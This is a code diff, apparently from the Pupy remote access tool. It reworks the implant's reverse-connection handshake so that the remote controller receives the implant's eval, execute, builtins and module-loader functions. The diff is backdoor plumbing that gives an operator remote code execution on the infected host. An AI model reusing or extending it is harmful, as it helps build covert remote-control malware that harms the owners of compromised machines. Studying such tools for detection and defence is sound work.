@@ -78,6 +78,14 @@ REVERSE_SLAVE_CONF = dict(
 )
 
 
+class Namespace(dict):
+    pass
+
+
+class Cleanups(list):
+    pass
+
+
 logger = pupy.get_logger('service')
 _all = as_native_string('*')
 
@@ -145,36 +153,40 @@ class ReverseSlaveService(Service):
     )
 
     def __init__(self, conn):
-        self.exposed_namespace = {}
-        self.exposed_cleanups = []
+        self.exposed_namespace = Namespace()
+        self.exposed_cleanups = Cleanups()
 
         super(ReverseSlaveService, self).__init__(conn)
 
     def on_connect(self):
-        self.exposed_namespace = {}
-        self.exposed_cleanups = []
+        self.exposed_namespace = Namespace()
+        self.exposed_cleanups = Cleanups()
         self._conn._config.update(REVERSE_SLAVE_CONF)
 
-        infos_buffer = Buffer()
-        infos = self.exposed_get_infos()
+        pupyimporter = __import__('pupyimporter')
 
-        try:
-            umsgpack.dump(infos, infos_buffer, ext_handlers=MSG_TYPES_PACK)
-        except Exception as e:
-            pupy.remote_error('on_connect failed: {}; infos={}', e, infos)
-
-        self._conn.root.initialize_v1(
+        self._conn.root.initialize_v2(
+            1, (
+                sys.version_info.major,
+                sys.version_info.minor
+            ),
             self.exposed_namespace,
             pupy.namespace,
             __import__(builtin),
             self.exposed_register_cleanup,
             self.exposed_unregister_cleanup,
-            self.exposed_obtain_call,
             self.exposed_exit,
             self.exposed_eval,
             self.exposed_execute,
-            __import__('pupyimporter'),
-            infos_buffer
+            self.exposed_get_infos(),
+            tuple(sys.modules),
+            tuple(pupyimporter.modules),
+            pupyimporter,
+            {
+                function: getattr(pupyimporter, function)
+                for function in dir(pupyimporter)
+                if hasattr(getattr(pupyimporter, function), '__call__')
+            }
         )
 
     def on_disconnect(self):
